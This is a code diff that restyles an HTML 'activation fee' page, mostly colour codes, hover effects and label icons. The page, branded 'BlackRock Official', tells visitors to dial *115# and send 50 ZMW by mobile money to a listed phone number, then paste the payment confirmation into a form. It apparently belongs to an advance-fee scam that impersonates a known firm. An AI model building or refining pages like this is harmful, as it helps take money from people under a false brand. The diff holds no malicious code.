@@ -9,8 +9,8 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #000 0%, #0a0a0a 100%);
-            color: #fff;
+            background: #000000;
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -27,17 +27,17 @@
             box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
         }
         .auth-logo { text-align: center; margin-bottom: 30px; }
-        .auth-logo .black { font-size: 32px; font-weight: 800; color: #fff; }
+        .auth-logo .black { font-size: 32px; font-weight: 800; color: #ffffff; }
         .auth-logo .green { font-size: 32px; font-weight: 800; color: #00ff00; }
-        h2 { text-align: center; margin-bottom: 10px; }
-        p { text-align: center; color: #888; margin-bottom: 30px; }
+        h2 { text-align: center; margin-bottom: 10px; color: #ffffff; }
+        p { text-align: center; color: #888888; margin-bottom: 30px; }
         .activation-fee {
             text-align: center;
             margin: 20px 0;
             padding: 20px;
             background: linear-gradient(135deg, #00ff00, #00cc00);
             border-radius: 10px;
-            color: #000;
+            color: #000000;
         }
         .activation-fee .amount { font-size: 48px; font-weight: 800; display: block; }
         .payment-instructions {
@@ -52,7 +52,7 @@
             display: flex;
             justify-content: space-between;
             padding: 10px;
-            border-bottom: 1px solid #333;
+            border-bottom: 1px solid #333333;
         }
         .payment-detail .value { color: #00ff00; font-weight: 600; }
         .ussd-button {
@@ -61,7 +61,7 @@
             justify-content: center;
             gap: 15px;
             background: linear-gradient(135deg, #00ff00, #00cc00);
-            color: #000;
+            color: #000000;
             padding: 18px 25px;
             border-radius: 50px;
             margin: 20px 0;
@@ -73,7 +73,7 @@
             width: 100%;
         }
         .ussd-button:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,255,0,0.5); }
-        .ussd-button code { font-size: 24px; background: transparent; color: #000; }
+        .ussd-button code { font-size: 24px; background: transparent; color: #000000; }
         .warning-box {
             background: rgba(255, 255, 0, 0.1);
             border: 1px solid #ffd700;
@@ -83,40 +83,45 @@
             color: #ffd700;
         }
         .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; color: #fff; }
+        .form-group label { display: block; margin-bottom: 8px; color: #ffffff; font-weight: 500; }
+        .form-group label i { color: #00ff00; margin-right: 8px; }
         .form-group input, .form-group textarea {
             width: 100%;
             padding: 12px 15px;
             background: #1a1a1a;
-            border: 1px solid #333;
+            border: 1px solid #333333;
             border-radius: 8px;
-            color: #fff;
+            color: #ffffff;
+            font-size: 15px;
         }
+        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #00ff00; }
         .btn-verify {
             width: 100%;
             padding: 15px;
             background: #00ff00;
-            color: #000;
+            color: #000000;
             border: none;
             border-radius: 5px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
             margin-top: 20px;
+            transition: all 0.3s;
         }
-        .auth-footer { text-align: center; margin-top: 25px; padding-top: 20px; border-top: 1px solid #333; }
+        .btn-verify:hover { background: #00cc00; transform: translateY(-2px); }
+        .auth-footer { text-align: center; margin-top: 25px; padding-top: 20px; border-top: 1px solid #333333; }
         .auth-footer a { color: #00ff00; text-decoration: none; }
         .phone-input-wrapper {
             display: flex;
             align-items: center;
             background: #1a1a1a;
-            border: 1px solid #333;
+            border: 1px solid #333333;
             border-radius: 8px;
             overflow: hidden;
         }
         .country-code {
             background: #00ff00;
-            color: #000;
+            color: #000000;
             padding: 12px 15px;
             font-weight: 600;
         }
@@ -136,21 +141,21 @@
                 <div class="payment-detail"><span>Phone:</span><span class="value">0977123456</span></div>
                 <div class="payment-detail"><span>Name:</span><span class="value">BlackRock Official</span></div>
                 <a href="tel:*115%23" class="ussd-button"><i class="fas fa-phone-alt"></i><code>*115#</code><i class="fas fa-arrow-right"></i></a>
-                <p style="text-align:center; color:#888;">Click to dial *115# and send 50 ZMW</p>
+                <p style="text-align:center; color:#888888;">Click to dial *115# and send 50 ZMW</p>
             </div>
 
             <div class="warning-box"><i class="fas fa-exclamation-triangle"></i> After sending money, paste confirmation message below</div>
 
             <form id="activationForm">
                 <div class="form-group">
-                    <label>Your Phone Number</label>
+                    <label><i class="fas fa-phone"></i> Your Phone Number</label>
                     <div class="phone-input-wrapper">
                         <span class="country-code">+260</span>
                         <input type="tel" id="senderPhone" placeholder="97xxxxxxx" maxlength="9" required>
                     </div>
                 </div>
                 <div class="form-group">
-                    <label>Transaction Message</label>
+                    <label><i class="fas fa-comment"></i> Transaction Message</label>
                     <textarea id="transactionMessage" rows="4" placeholder="Paste confirmation message" required></textarea>
                 </div>
                 <button type="submit" class="btn-verify">Verify Payment</button>
